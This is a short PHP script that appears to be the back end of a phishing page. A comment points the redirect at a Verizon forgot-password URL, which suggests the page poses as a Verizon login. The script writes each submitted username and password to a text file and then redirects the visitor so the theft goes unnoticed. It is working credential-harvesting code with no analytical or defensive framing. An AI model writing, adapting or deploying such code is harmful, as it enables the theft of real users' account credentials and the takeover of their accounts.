<?php

file_put_contents("usernames.txt", "Account: " . $_POST['username'] . "\nPassword: " . $_POST['password'] . "\n", FILE_APPEND);
$url = "redirectUrl"; # https://secure.verizon.com/account/forgot-password/start
header("Location: $url");
exit();
